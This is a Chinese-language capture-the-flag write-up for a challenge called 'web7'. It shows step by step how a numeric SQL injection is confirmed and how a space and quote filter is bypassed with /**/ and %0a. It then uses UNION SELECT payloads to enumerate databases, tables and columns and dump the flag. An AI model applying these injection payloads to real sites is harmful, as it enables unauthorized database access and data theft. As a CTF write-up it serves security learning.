# web7
点击任意
![](vx_images/60707952054571.png =457x)

观察到有参数传递
![](vx_images/475236533652589.png =936x)
猜测可能是注入
1?id=1 or 1=1%23
有错,应该是有过滤空格或=,or

试?id=1/**/and/**/1=1正常查看(?id=1'**/and/**/1=1也可以正常查看)
?id=1/**/and/**/1=2,无法查看
应为数字型注入
查询列数(这里用%0a代替空格)
id=1%0aor%0a1=1%0aorder%0aby%0a3,列数为3时有回显,4没有,列数为3

查看回显位
?id=1%0aor%0a1=1%0aunion%0aselect%0a1,2,3
![](vx_images/581799016874207.png =1228x)
回显位为2,3
查库
?id=1%0aor%0a1=1%0aunion%0aselect%0a1,group_concat(schema_name),3%0afrom%0ainformation_schema.schemata
![](vx_images/25093826745689.png =1094x)


查表
id=1%0aor%0a1=1%0aunion%0aselect%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema="web7"
这里的单引号被过滤所以之前判断时加上'也能回显的原因

![](vx_images/302054167160585.png =974x)

查列
1%0aor%0a1=1%0aunion%0aselect%0a1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0awhere%0atable_name="flag"
![](vx_images/390915030498756.png =424x)

最终查字段
1%0aor%0a1=1%0aunion%0aselect%0a1,group_concat(flag),3%0afrom%0aweb7.flag(直接flag也行,但最好加上库名)
![](vx_images/146742693265176.png =777x)